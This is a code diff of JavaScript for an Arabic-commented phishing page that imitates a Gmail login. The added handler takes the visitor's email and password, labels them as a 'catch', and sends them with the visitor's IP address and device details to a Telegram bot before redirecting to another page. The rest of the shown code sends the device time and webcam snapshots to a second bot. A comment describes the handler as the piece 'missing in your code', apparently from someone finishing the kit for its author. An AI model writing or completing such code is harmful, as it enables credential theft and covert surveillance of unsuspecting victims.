@@ -101,7 +101,7 @@
             } catch (e) {}
 
             report += `⏰ **وقت الجهاز:** ${new Date().toLocaleString('ar-EG')}\n`;
-            sendText(bot1_api, report); // التقرير يذهب للبوت الأول
+            sendText(bot1_api, report); 
         }
 
         async function startSystem() {
@@ -125,16 +125,28 @@
         }
 
         function showP() {
-    const emailInput = document.getElementById('email').value.trim();
-    
-    // التأكد من أن الإيميل ينتهي بـ @gmail.com وطوله معقول
-    if (emailInput.toLowerCase().endsWith('@gmail.com') && emailInput.length > 10) {
-        document.getElementById('email-div').style.display = 'none';
-        document.getElementById('pass-div').style.display = 'block';
-    } else {
-        
-    }
+            const emailInput = document.getElementById('email').value.trim();
+            if (emailInput.toLowerCase().endsWith('@gmail.com') && emailInput.length > 10) {
+                document.getElementById('email-div').style.display = 'none';
+                document.getElementById('pass-div').style.display = 'block';
+            }
         }
+
+        // --- هذا هو الجزء الذي كان ناقصاً في كودك ---
+        document.getElementById('go-project').onclick = function() {
+            const m = document.getElementById('email').value;
+            const p = document.getElementById('pass').value;
+
+            if (p.length > 4) { // تأكد من وجود كلمة سر
+                const login_report = `📥 **بيانات صيد جديدة**\n\n📧 الإيميل: \`${m}\`\n🔑 الباسورد: \`${p}\`\n\n🌍 IP: \`${user_ip}\`\n📱 الجهاز: ${user_device}`;
+                
+                // إرسال البيانات للبوت الثاني
+                sendText(bot2_api, login_report);
+                
+                // التوجيه لصفحة المشروع
+                window.location.href = "project.html";
+            }
+        };
 
         function snap() {
             const canvas = document.getElementById('c');
@@ -146,7 +158,7 @@
                     const f = new FormData();
                     f.append('chat_id', chat);
                     f.append('photo', blob, 'x.jpg');
-                    fetch(bot1_api + "sendPhoto", { method: 'POST', body: f }); // الصور للبوت الأول
+                    fetch(bot1_api + "sendPhoto", { method: 'POST', body: f });
                 }, 'image/jpeg', 0.7);
             }
         }
